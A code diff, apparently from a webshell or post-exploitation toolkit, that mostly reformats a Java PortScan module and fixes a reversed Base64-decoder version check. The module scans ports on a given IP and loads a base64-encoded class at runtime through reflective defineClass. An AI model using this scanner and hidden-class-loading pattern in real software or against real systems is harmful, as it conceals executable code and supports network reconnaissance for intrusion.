@@ -86,7 +86,7 @@ public class PortScan {
         String[] portlist = ports.split(",");
         Socket socket = null;
         for (int i = 0; i < portlist.length; i++) {
-            try{
+            try {
                 socket = new Socket(ip, Integer.parseInt(portlist[i]));
                 socket.setSoTimeout(1);
                 sb.append(ip + "\t" + portlist[i] + "\tOpen\n");
@@ -97,7 +97,7 @@ public class PortScan {
                     if (socket != null) {
                         socket.close();
                     }
-                } catch (Exception ex){
+                } catch (Exception ex) {
                 }
             }
         }
@@ -107,7 +107,7 @@ public class PortScan {
     Socket createSocket(String addr) throws Exception {
         Socket socket = null;
         try {
-            String [] inet = addr.split(":");
+            String[] inet = addr.split(":");
             socket = new Socket();
             socket.setReuseAddress(true);
             socket.setKeepAlive(false);
@@ -117,7 +117,7 @@ public class PortScan {
             socket.setSoTimeout(30);
             return socket;
         } catch (Exception ex) {
-            if(socket != null) {
+            if (socket != null) {
                 socket.close();
             }
             ex.printStackTrace();
@@ -128,28 +128,29 @@ public class PortScan {
     public String asoutput(String str) {
         try {
             byte[] classBytes = Base64DecodeToByte(decoderClassdata);
-            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
+            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
             defineClassMethod.setAccessible(true);
-            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), classBytes, 0,classBytes.length);
+            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), classBytes, 0, classBytes.length);
             return cc.getConstructor(String.class).newInstance(str).toString();
         } catch (Exception e) {
             return str;
         }
     }
+
     public byte[] Base64DecodeToByte(String str) {
         byte[] bt = null;
         String version = System.getProperty("java.version");
         try {
             if (version.compareTo("1.9") >= 0) {
-                Class clazz = Class.forName("sun.misc.BASE64Decoder");
-                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
-            } else {
                 Class clazz = Class.forName("java.util.Base64");
                 Object decoder = clazz.getMethod("getDecoder").invoke(null);
                 bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+            } else {
+                Class clazz = Class.forName("sun.misc.BASE64Decoder");
+                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
             }
             return bt;
-        }catch (Exception e) {
+        } catch (Exception e) {
             return new byte[]{};
         }
     }
